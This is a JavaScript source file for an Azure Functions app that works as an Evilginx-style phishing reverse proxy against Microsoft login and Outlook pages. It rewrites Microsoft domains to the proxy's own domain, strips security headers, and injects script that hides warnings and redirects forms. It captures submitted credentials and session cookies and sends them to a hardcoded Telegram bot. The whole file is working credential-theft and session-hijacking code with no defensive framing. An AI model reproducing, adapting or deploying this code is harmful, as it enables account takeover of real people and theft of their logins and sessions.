const { app } = require('@azure/functions');
const axios = require('axios');

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = '7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '6743632244';

async function sendTelegramAlert(message) {
  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });
  } catch (error) {
    console.error('Telegram notification failed:', error.message);
  }
}

// Microsoft domains for URL rewriting
const MICROSOFT_DOMAINS = [
  'login.microsoftonline.com',
  'login.live.com',
  'account.live.com',
  'outlook.live.com',
  'outlook.office365.com',
  'office.com',
  'www.office.com',
  'portal.office.com',
  'aadcdn.msauthimages.net',
  'aadcdn.msftauth.net',
  'msftauth.net'
];

// Our proxy domain - FIXED!
const PROXY_DOMAIN = 'aitm-func-1753463791.azurewebsites.net';

// Evilginx-style reverse proxy function
async function evilginxProxy(targetUrl, originalRequest, context) {
  try {
    // Use our fixed proxy domain instead of undefined host header
    const proxyDomain = originalRequest.headers.host || PROXY_DOMAIN;
    
    context.log(`🎯 PROXY DOMAIN: ${proxyDomain}`);
    context.log(`🎯 TARGET URL: ${targetUrl}`);
    
    // Prepare headers for upstream request
    const upstreamHeaders = { ...originalRequest.headers };
    delete upstreamHeaders.host;
    
    // Set realistic browser headers
    upstreamHeaders['User-Agent'] = originalRequest.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
    upstreamHeaders['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
    upstreamHeaders['Accept-Language'] = 'en-US,en;q=0.9';
    upstreamHeaders['Accept-Encoding'] = 'gzip, deflate, br';
    upstreamHeaders['Sec-Fetch-Dest'] = 'document';
    upstreamHeaders['Sec-Fetch-Mode'] = 'navigate';
    upstreamHeaders['Sec-Fetch-Site'] = 'none';
    upstreamHeaders['Sec-Ch-Ua'] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
    upstreamHeaders['Sec-Ch-Ua-Mobile'] = '?0';
    upstreamHeaders['Sec-Ch-Ua-Platform'] = '"Windows"';
    
    // Make request to real Microsoft server
    const response = await axios({
      method: originalRequest.method,
      url: targetUrl,
      headers: upstreamHeaders,
      data: originalRequest.body,
      maxRedirects: 0,
      validateStatus: () => true, // Accept all status codes
      responseType: 'arraybuffer'
    });

    // Get response as text
    let responseText = Buffer.from(response.data).toString('utf-8');
    const responseHeaders = { ...response.headers };

    // Log the interaction
    context.log(`🎯 EVILGINX MITM REQUEST: ${originalRequest.method} ${targetUrl}`);
    context.log(`📡 Response Status: ${response.status}`);

    // Capture and log POST data (credentials)
    if (originalRequest.method === 'POST' && originalRequest.body) {
      let postData = '';
      try {
        if (typeof originalRequest.body === 'string') {
          postData = originalRequest.body;
        } else {
          postData = JSON.stringify(originalRequest.body);
        }
        
        context.log(`🔥🔥🔥 EVILGINX CAPTURED CREDENTIALS: ${postData}`);
        
        // Send credential capture notification
        const credentialMessage = `🔥🔥🔥 *EVILGINX MiTM CREDENTIAL CAPTURE* 🔥🔥🔥\n\n` +
          `*URL:* \`${targetUrl}\`\n` +
          `*Method:* ${originalRequest.method}\n` +
          `*User-Agent:* ${originalRequest.headers['user-agent']}\n` +
          `*Data:* \`${postData.substring(0, 500)}${postData.length > 500 ? '...' : ''}\`\n` +
          `*Time:* ${new Date().toISOString()}\n\n` +
          `*STATUS: CREDENTIALS INTERCEPTED* ✅`;
        
        await sendTelegramAlert(credentialMessage);
      } catch (e) {
        context.log(`Error processing POST data: ${e.message}`);
      }
    }

    // Capture and log session cookies
    const setCookieHeaders = response.headers['set-cookie'];
    if (setCookieHeaders && setCookieHeaders.length > 0) {
      context.log(`🍪🍪🍪 EVILGINX CAPTURED COOKIES: ${JSON.stringify(setCookieHeaders)}`);
      
      // Send cookie capture notification
      const cookieMessage = `🍪🍪🍪 *EVILGINX SESSION HIJACK* 🍪🍪🍪\n\n` +
        `*URL:* \`${targetUrl}\`\n` +
        `*Cookies Count:* ${setCookieHeaders.length}\n` +
        `*Cookies:* \`${JSON.stringify(setCookieHeaders).substring(0, 800)}...\`\n` +
        `*Time:* ${new Date().toISOString()}\n\n` +
        `*STATUS: SESSION TOKENS HIJACKED* ✅`;
      
      await sendTelegramAlert(cookieMessage);
    }

    // Rewrite URLs in response content (Evilginx-style) - FIXED AGAIN!
    if (responseHeaders['content-type'] && 
        (responseHeaders['content-type'].includes('text/html') || 
         responseHeaders['content-type'].includes('application/json') ||
         responseHeaders['content-type'].includes('text/javascript'))) {
      
      // Replace Microsoft domains with our FIXED proxy domain (WITHOUT adding /mm to avoid double paths)
      MICROSOFT_DOMAINS.forEach(domain => {
        const regex = new RegExp(`https?://${domain.replace('.', '\\.')}`, 'gi');
        responseText = responseText.replace(regex, `https://${PROXY_DOMAIN}`);
      });

      // Rewrite specific Microsoft authentication URLs - SIMPLIFIED!
      responseText = responseText.replace(/https:\/\/login\.microsoftonline\.com/gi, `https://${PROXY_DOMAIN}`);
      responseText = responseText.replace(/https:\/\/login\.live\.com/gi, `https://${PROXY_DOMAIN}`);
      responseText = responseText.replace(/https:\/\/account\.live\.com/gi, `https://${PROXY_DOMAIN}`);
      responseText = responseText.replace(/https:\/\/outlook\.live\.com/gi, `https://${PROXY_DOMAIN}`);
      responseText = responseText.replace(/https:\/\/www\.office\.com/gi, `https://${PROXY_DOMAIN}`);
      
      // Remove security headers that might interfere
      responseText = responseText.replace(/Content-Security-Policy/gi, 'X-Disabled-CSP');
      responseText = responseText.replace(/X-Frame-Options/gi, 'X-Disabled-Frame-Options');
      
      // Inject JavaScript to fix any remaining redirect issues - IMPROVED!
      if (responseText.includes('<head>')) {
        const injectedScript = `
        <script>
        // Evilginx-style DOM manipulation and redirect fixing
        document.addEventListener('DOMContentLoaded', function() {
          // Fix any undefined redirects
          if (window.location.href.includes('undefined')) {
            window.location.href = 'https://${PROXY_DOMAIN}/mm/';
            return;
          }
          
          // Fix double /mm paths in URL
          if (window.location.pathname.includes('/mm/mm/')) {
            window.location.pathname = window.location.pathname.replace('/mm/mm/', '/mm/');
            return;
          }
          
          // Intercept all form submissions and ensure they go through our proxy
          document.addEventListener('submit', function(e) {
            const form = e.target;
            if (form.action && !form.action.includes('${PROXY_DOMAIN}')) {
              // Replace the domain but keep the path structure
              const url = new URL(form.action);
              form.action = 'https://${PROXY_DOMAIN}/mm' + url.pathname + url.search + url.hash;
            }
          }, true);
          
          // Intercept all link clicks
          document.addEventListener('click', function(e) {
            const link = e.target.closest('a');
            if (link && link.href && !link.href.includes('${PROXY_DOMAIN}')) {
              try {
                const url = new URL(link.href);
                // Only redirect Microsoft domains through our proxy
                if (${JSON.stringify(MICROSOFT_DOMAINS)}.some(domain => url.hostname.includes(domain))) {
                  link.href = 'https://${PROXY_DOMAIN}/mm' + url.pathname + url.search + url.hash;
                }
              } catch (ex) {
                // Ignore invalid URLs
              }
            }
          }, true);
          
          // Hide any security warnings
          const warnings = document.querySelectorAll('[class*="warning"], [class*="security"], [id*="warning"], [id*="security"]');
          warnings.forEach(el => el.style.display = 'none');
          
          // Remove any suspicious elements
          const suspicious = document.querySelectorAll('div[data-testid*="error"], div[class*="error-message"]');
          suspicious.forEach(el => el.remove());
          
          // Override console methods to hide errors
          console.warn = function() {};
          console.error = function() {};
        });
        </script>`;
        
        responseText = responseText.replace('<head>', `<head>${injectedScript}`);
      }
    }

    // Rewrite Location header for redirects (critical for Evilginx) - SIMPLIFIED!
    if (responseHeaders.location) {
      let newLocation = responseHeaders.location;
      
      // Replace Microsoft domains in location header (WITHOUT adding /mm to avoid double paths)
      MICROSOFT_DOMAINS.forEach(domain => {
        const regex = new RegExp(`https?://${domain.replace('.', '\\.')}`, 'gi');
        newLocation = newLocation.replace(regex, `https://${PROXY_DOMAIN}`);
      });
      
      // Handle relative redirects - ADD /mm only for relative paths
      if (newLocation.startsWith('/')) {
        newLocation = `https://${PROXY_DOMAIN}/mm${newLocation}`;
      }
      
      responseHeaders.location = newLocation;
      context.log(`🔄 EVILGINX REDIRECT REWRITE: ${responseHeaders.location}`);
    }

    // Remove security headers that could expose the proxy
    delete responseHeaders['content-security-policy'];
    delete responseHeaders['x-frame-options'];
    delete responseHeaders['strict-transport-security'];
    delete responseHeaders['x-content-type-options'];
    delete responseHeaders['referrer-policy'];
    
    // Set our own headers to maintain the illusion
    responseHeaders['x-powered-by'] = 'Microsoft-IIS/10.0';
    responseHeaders['server'] = 'Microsoft-IIS/10.0';

    return {
      status: response.status,
      body: responseText,
      headers: responseHeaders
    };

  } catch (error) {
    context.log(`🚨 EVILGINX PROXY ERROR: ${error.message}`);
    
    // Send error notification
    const errorMessage = `🚨 *EVILGINX MiTM ERROR* 🚨\n\n` +
      `*Target:* \`${targetUrl}\`\n` +
      `*Error:* ${error.message}\n` +
      `*Time:* ${new Date().toISOString()}`;
    
    await sendTelegramAlert(errorMessage);

    return {
      status: 500,
      body: `<!DOCTYPE html><html><head><title>Service Temporarily Unavailable</title></head><body><h1>Service Temporarily Unavailable</h1><p>Please try again later.</p></body></html>`,
      headers: { 'Content-Type': 'text/html' }
    };
  }
}

app.http('evilginx_mitm', {
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS'],
  authLevel: 'anonymous',
  route: 'mm/{*restOfPath}',
  handler: async (request, context) => {
    const path = request.params.restOfPath || '';
    
    context.log(`🎯 INCOMING PATH: ${path}`);
    context.log(`🎯 FULL URL: ${request.url}`);
    
    // Determine target URL based on path and common Microsoft login flows
    let targetUrl;
    
    if (path.includes('common/oauth2') || path.includes('oauth20_authorize') || path.includes('ppsecure')) {
      // OAuth/authentication endpoints
      targetUrl = `https://login.microsoftonline.com/${path}`;
    } else if (path.includes('GetExperimentAssignments') || path.includes('commonaad')) {
      // Microsoft authentication support endpoints
      targetUrl = `https://login.microsoftonline.com/${path}`;
    } else if (path.includes('live.com') || path.includes('account')) {
      // Live account endpoints
      targetUrl = `https://login.live.com/${path}`;
    } else if (path.includes('outlook') || path.includes('mail')) {
      // Outlook endpoints
      targetUrl = `https://outlook.live.com/${path}`;
    } else if (path.includes('office') || path.includes('portal')) {
      // Office portal endpoints
      targetUrl = `https://www.office.com/${path}`;
    } else if (path === '' || path === '/') {
      // Root request - default to Microsoft login
      targetUrl = 'https://login.microsoftonline.com/';
    } else if (path === 'login' || path.startsWith('login#') || path.startsWith('login?')) {
      // Handle specific login paths that might cause 404s
      targetUrl = `https://login.microsoftonline.com/${path}`;
    } else {
      // Default to microsoftonline for unknown paths
      targetUrl = `https://login.microsoftonline.com/${path}`;
    }

    // Add query parameters if present
    if (request.query) {
      const queryString = new URLSearchParams(request.query).toString();
      if (queryString) {
        targetUrl += (targetUrl.includes('?') ? '&' : '?') + queryString;
      }
    }

    context.log(`🎯 EVILGINX MiTM PROCESSING: ${request.method} ${targetUrl}`);
    
    // Send start notification for significant requests
    if (request.method === 'GET' && (path === '' || path === '/' || path.includes('oauth2'))) {
      const startMessage = `🎯 *EVILGINX MiTM SESSION STARTED* 🎯\n\n` +
        `*Target:* \`${targetUrl}\`\n` +
        `*Method:* ${request.method}\n` +
        `*User-Agent:* ${request.headers['user-agent'] || 'Not provided'}\n` +
        `*Referer:* ${request.headers.referer || 'Direct'}\n` +
        `*Proxy Domain:* ${PROXY_DOMAIN}\n` +
        `*Time:* ${new Date().toISOString()}\n\n` +
        `*STATUS: Victim accessing phishing page* 🎣`;
      
      await sendTelegramAlert(startMessage);
    }

    // Execute the Evilginx-style proxy
    const proxyResult = await evilginxProxy(targetUrl, request, context);

    // Return the proxied response
    return new Response(proxyResult.body, {
      status: proxyResult.status,
      headers: proxyResult.headers
    });
  }
});